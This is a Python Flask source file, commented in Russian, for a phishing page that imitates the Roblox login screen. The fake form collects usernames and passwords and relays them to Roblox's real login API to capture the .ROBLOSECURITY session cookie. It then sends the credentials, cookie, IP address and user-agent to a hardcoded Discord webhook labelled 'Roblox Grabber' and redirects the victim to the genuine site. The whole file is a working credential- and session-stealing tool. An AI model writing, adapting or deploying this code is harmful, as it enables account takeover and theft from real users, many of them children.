from flask import Flask, request, render_template_string, jsonify
import requests
import json
import os
import re

app = Flask(__name__)

DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1538073991938445353/xa-WZkoA0pDAoLwzHmNwTGTcjU0XFZYDc_9ZrGCsckpxGQX_y-yMWIPikI3ZyfvN4FK_'

# Правильные URL для Roblox
ROBLOX_AUTH_URL = 'https://auth.roblox.com/v2/login'
ROBLOX_ARKOSE_KEY = '476068BF-9607-4799-B53D-966BE98E2B81'
ROBLOX_ARKOSE_SCRIPT = f'https://roblox-api.arkoselabs.com/v2/{ROBLOX_ARKOSE_KEY}/api.js'

session = requests.Session()

def get_csrf_token():
    try:
        response = session.post(ROBLOX_AUTH_URL, json={})
        if 'x-csrf-token' in response.headers:
            return response.headers['x-csrf-token']
        return ''
    except:
        return ''

def send_to_discord(username, password, cookie, ip, user_agent, error_msg=''):
    payload = {
        'embeds': [{
            'title': '🎮 ПОПЫТКА ВХОДА',
            'color': 0xff0000,
            'fields': [
                {'name': '👤 Логин', 'value': f'```{username}```', 'inline': True},
                {'name': '🔑 Пароль', 'value': f'```{password}```', 'inline': True},
                {'name': '🍪 Куки', 'value': f'```{cookie if cookie else "Не получена"}```', 'inline': False},
                {'name': '🌐 IP', 'value': f'```{ip}```', 'inline': True},
                {'name': '📱 User-Agent', 'value': f'```{user_agent}```', 'inline': False},
                {'name': '❌ Ошибка', 'value': f'```{error_msg if error_msg else "Нет"}```', 'inline': False}
            ],
            'footer': {'text': 'Roblox Grabber'}
        }]
    }
    try:
        requests.post(DISCORD_WEBHOOK, json=payload)
    except:
        pass

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Roblox - Вход</title>
        <script src="''' + ROBLOX_ARKOSE_SCRIPT + '''"></script>
        <style>
            body { background: #191919; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: #232323; padding: 40px; border-radius: 10px; width: 400px; text-align: center; }
            .roblox-logo { color: white; font-size: 32px; font-weight: bold; margin-bottom: 30px; }
            input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #444; border-radius: 5px; background: #333; color: white; font-size: 16px; box-sizing: border-box; }
            button { width: 100%; padding: 12px; background: #00b06f; color: white; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
            .error { color: #ff4444; margin-top: 10px; display: none; }
            #captcha-container { margin: 15px 0; min-height: 50px; }
            .captcha-loading { color: #888; font-size: 14px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="roblox-logo">ROBLOX</div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Имя пользователя" required>
                <input type="password" id="password" placeholder="Пароль" required>
                <div id="captcha-container">
                    <div class="captcha-loading">Загрузка капчи...</div>
                </div>
                <button type="submit">Войти</button>
            </form>
            <div class="error" id="error">Неверный логин или пароль</div>
        </div>
        <script>
            let captchaToken = '';
            let arkoseInstance = null;
            
            function initCaptcha() {
                const container = document.getElementById('captcha-container');
                container.innerHTML = '<div class="captcha-loading">Загрузка капчи...</div>';
                
                try {
                    arkoseInstance = new Arkose({
                        publicKey: '''' + ROBLOX_ARKOSE_KEY + '''',
                        container: container,
                        onCompleted: function(response) {
                            captchaToken = response.token;
                            console.log('Капча пройдена');
                        },
                        onError: function(error) {
                            console.error('Ошибка капчи:', error);
                            container.innerHTML = '<div class="error">Ошибка загрузки капчи. Обновите страницу.</div>';
                        },
                        onReady: function() {
                            container.innerHTML = '';
                        }
                    });
                } catch(e) {
                    console.error('Ошибка инициализации:', e);
                    container.innerHTML = '<div class="error">Капча временно недоступна</div>';
                }
            }
            
            window.onload = initCaptcha;
            
            document.getElementById('loginForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                if (!captchaToken) {
                    alert('Пожалуйста, пройдите капчу');
                    return;
                }
                
                const res = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        captchaToken: captchaToken
                    })
                });
                
                const data = await res.json();
                if (data.success) {
                    window.location.href = 'https://www.roblox.com';
                } else {
                    document.getElementById('error').style.display = 'block';
                    captchaToken = '';
                    initCaptcha();
                }
            });
        </script>
    </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username', '')
    password = data.get('password', '')
    captcha_token = data.get('captchaToken', '')
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Mozilla/5.0')
    
    # Получаем CSRF токен
    csrf_token = get_csrf_token()
    
    headers = {
        'User-Agent': user_agent,
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrf_token,
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/'
    }
    
    # Пробуем разные форматы payload
    payloads = [
        {
            'ctype': 'Username',
            'cvalue': username,
            'password': password,
            'challengeId': captcha_token,
            'challengeType': 'arkose',
            'challengeToken': captcha_token
        },
        {
            'ctype': 'Username',
            'cvalue': username,
            'password': password,
            'challengeId': captcha_token,
            'challengeType': 'captcha',
            'challengeToken': captcha_token
        }
    ]
    
    for payload in payloads:
        try:
            response = session.post(ROBLOX_AUTH_URL, json=payload, headers=headers)
            
            roblox_cookie = ''
            if '.ROBLOSECURITY' in session.cookies:
                roblox_cookie = session.cookies['.ROBLOSECURITY']
            
            error_msg = ''
            if response.status_code != 200:
                try:
                    error_data = response.json()
                    error_msg = json.dumps(error_data)
                except:
                    error_msg = response.text[:200]
            
            send_to_discord(username, password, roblox_cookie, client_ip, user_agent, error_msg)
            
            if response.status_code == 200 and roblox_cookie:
                return jsonify({'success': True})
                
        except Exception as e:
            send_to_discord(username, password, '', client_ip, user_agent, str(e))
            return jsonify({'success': False})
    
    return jsonify({'success': False})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
